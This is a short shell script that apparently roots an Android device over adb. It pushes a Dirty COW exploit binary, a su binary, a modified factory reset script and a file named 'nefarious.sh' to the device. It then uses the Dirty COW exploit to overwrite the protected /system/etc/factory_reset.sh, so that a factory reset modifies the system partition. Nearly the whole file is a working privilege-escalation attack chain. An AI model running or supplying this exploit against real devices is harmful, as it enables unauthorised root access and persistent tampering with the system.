#!/bin/sh

#Goal - modify factory reset script to add things to the system partition for us...

#Process
# 1. Copy dirtycow, modified factory_reset.sh and other interesting bits over
# 2. Use dirtycow to overwrite \system\etc\factory_reset.sh with our modified file
# 3. Initiate factory reset process
# 4. ???
# 5. Root!

echo "Disconnecting other adb devices\n"
adb disconnect
sleep 1

echo "Connecting to 172.16.1.217\n"
adb connect 172.16.1.217

echo "Attempting to push payloads to /data/local/tmp/rootme\n"
adb shell 'mkdir /data/local/tmp/rootme'
adb push factory_reset_mod.sh /data/local/tmp/rootme/
adb push dirtycow /data/local/tmp/rootme/
adb push nefarious.sh /data/local/tmp/rootme/
adb push su /data/local/tmp/rootme/



echo "Exploiting dirtycow to replace factory_reset.sh with our own\n"
adb shell '/data/local/tmp/rootme/dirtycow /system/etc/factory_reset.sh /data/local/tmp/rootme/factory_reset_mod.sh'

echo "Okay - should be all set, initiate factory reset and hope for the best!"

